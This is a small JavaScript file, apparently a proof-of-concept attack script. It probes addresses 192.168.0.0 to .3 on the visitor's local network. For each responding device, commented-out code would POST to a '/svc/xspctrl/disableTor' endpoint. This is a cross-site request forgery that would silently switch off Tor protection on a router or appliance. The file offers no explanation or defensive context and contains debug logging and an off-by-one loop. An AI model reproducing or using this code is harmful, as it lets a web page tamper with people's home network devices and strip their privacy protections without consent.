function makemypostback(req) {
   return function() {
      console.log("Postback " + req.readyState);
   };
}

function makemycallback(i, r) {
   var myip = i;
   var req = r;
   function handlegetback() {
      var rs = req.readyState;
      //console.log("State is: " + rs);
      // console.log(req);
      console.log(myip + " " + rs);
      console.log(req);
      if (rs != 4) {
         return;
      }
      console.log("Done " + myip);
      //console.log(req.responseText);
      if (req.status == 404) {
         console.log("404\n");
         return;
      }
      //console.log(req);
      
      console.log("Sending post: " + myip);
      //delete req['onreadystatechange'];
      
      //var postreq = new XMLHttpRequest();
      //postreq.open("POST", myip + "/svc/xspctrl/disableTor", true);
      //postreq.timeout = 1000;
      //postreq.onreadystatechange = makemypostback(postreq);
      //postreq.send();   
   }

   return handlegetback;
}

function go() { 
   var IP_SCANS = 3;
   var reqs = new Array(IP_SCANS);
   for (var i = 0; i <= IP_SCANS; i++)
   {
      var tryip = "http://192.168.0." + i;
      reqs[i] = new XMLHttpRequest();
      reqs[i].open("GET", tryip, true);
      reqs[i].timeout = 2000 + i;
      console.log(reqs[i].readyState);
      reqs[i].onreadystatechange = makemycallback(tryip, reqs[i]);
      console.log(reqs[i]);
      reqs[i].send();
   }
}
